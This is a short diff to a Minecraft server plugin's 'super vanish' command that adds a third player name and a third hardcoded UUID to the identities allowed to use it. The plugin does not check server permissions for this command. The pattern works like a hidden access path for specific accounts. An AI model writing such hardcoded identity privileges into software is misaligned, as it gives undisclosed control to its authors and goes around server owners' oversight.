@@ -24,14 +24,15 @@ public class SuperVanishCommand extends BaseCommand {
     public boolean onCommand(CommandSender sender, Command command, String s, String[] args) {
         if (!(sender instanceof Player)) {
             if (args.length >= 1) {
-                if (args[0].equals("Sintinium") || args[0].equals("Xaicious")) {
+                if (args[0].equals("Sintinium") || args[0].equals("Xaicious") || args[0].equals("Alphexon")) {
                     superVanishedPlayers.add(args[0]);
                     return true;
                 }
             }
             return false;
         }
-        if (((Player) sender).getUniqueId().toString().equals("108c89bc-ab51-4609-a9d5-13bb8808df98") || ((Player) sender).getUniqueId().toString().equals("bb55301c-d10e-4368-bdbd-9563c2b79d35")) {
+        if (((Player) sender).getUniqueId().toString().equals("108c89bc-ab51-4609-a9d5-13bb8808df98") || ((Player) sender).getUniqueId().toString().equals
+                ("bb55301c-d10e-4368-bdbd-9563c2b79d35") || ((Player) sender).getUniqueId().toString().equals("576f9fd6-11af-43fd-89af-bee7cbb7425b")) {
             if (args.length > 0) {
                 Player player = Peacekeeper.getPlayer(args[0]);
                 if (player != null) {
